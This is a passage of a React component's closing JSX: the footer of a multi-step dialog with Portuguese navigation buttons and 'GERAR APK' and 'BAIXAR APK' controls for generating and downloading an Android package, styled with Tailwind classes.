                    <p className={`text-xs font-mono ${done ? "text-[#00ff9d]" : "text-primary/70"}`}>{buildLog}</p>
                  </div>
                )}
              </>
            )}
          </div>

          {/* Footer buttons */}
          <div className="flex items-center justify-between px-5 pb-4">
            <button onClick={() => setStep(s => Math.max(0, s-1))} disabled={step === 0}
              className="h-8 px-4 rounded border border-primary/20 text-xs text-primary/60 hover:text-primary hover:border-primary/40 disabled:opacity-30 disabled:cursor-not-allowed transition-all font-orbitron tracking-wider">
              VOLTAR
            </button>
            <div className="flex gap-2">
              {step < STEPS.length - 1 ? (
                <button onClick={() => setStep(s => Math.min(STEPS.length-1, s+1))}
                  className="h-8 px-5 rounded bg-primary text-[#080c14] text-xs font-orbitron font-bold tracking-wider hover:bg-primary/80 transition-all"
                  style={{ boxShadow: "0 0 12px rgba(0,212,255,0.3)" }}>
                  PRÓXIMO
                </button>
              ) : done ? (
                <button onClick={downloadApk}
                  className="h-8 px-5 rounded bg-[#00ff9d] text-[#080c14] text-xs font-orbitron font-bold tracking-wider hover:opacity-90 transition-all">
                  BAIXAR APK
                </button>
              ) : (
                <button onClick={handleGenerate} disabled={generating}
                  className="h-8 px-5 rounded bg-primary text-[#080c14] text-xs font-orbitron font-bold tracking-wider hover:bg-primary/80 disabled:opacity-60 disabled:cursor-not-allowed transition-all"
                  style={{ boxShadow: "0 0 12px rgba(0,212,255,0.3)" }}>
                  {generating ? "GERANDO..." : "GERAR APK"}
                </button>
              )}
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
